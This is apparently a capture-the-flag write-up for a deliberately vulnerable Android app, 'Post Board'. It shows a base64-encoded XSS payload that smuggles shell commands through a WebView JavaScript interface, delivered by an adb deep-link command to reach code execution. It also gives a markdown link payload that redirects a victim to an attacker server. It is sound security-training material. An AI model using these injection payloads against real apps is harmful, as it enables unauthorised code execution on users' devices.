# Writeup for Post Board challenge.

>here's how to use the scripts only as proof of concept.

Check the full Writeup at my blog --> [Post Board](https://blog.parad0x.vip/blog/2024/10/01/PostBoard1.html)
---

## Objective
This challenge is designed to delve into the complexities of Android's WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It's a great opportunity to engage with Android application security focusing on WebView security issues.

## RCE
To achieve the RCE first we need to create a payload
using the XSS vulnerability and encode in base64.

```sh
echo "<img src=\"x\" \
onerror=\"WebAppInterface.postCowsayMessage('Moooo;whoami;pwd;date') \
\">"|base64
```

Then send it through the deep link.

```sh
adb shell am start -a android.intent.action.VIEW \ 
-n com.mobilehackinglab.postboard/.MainActivity -d \ 
"postboard://postmessage/PGltZyBzcmM9IngiIG9uZXJyb3I9IldlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgnTW9vb287d2hvYW1pO3B3ZDtkYXRlJykgIj4K"
```
<img width="400" src="https://github.com/user-attachments/assets/6c95881a-fd1d-405b-893e-bcd023958e0d"/>


## Bonus XSS on Chrome Client 
Sending a malicious link to the application it's possible to redirect the victim to my evil website. The app will convert my markdown in a clickable link then my evil website will load.

Payload: `[Innocent Link](http://{YOUR_SERVER_IP:PORT}/)` 

<img weight="300" width="300" src="https://github.com/user-attachments/assets/b2be9b70-a5e5-46fc-b8c2-37b5a7d4653c"/>


## Conclusion

On my blog, I'll cover step by step to achieve the RCE and exploit the webview weakness.
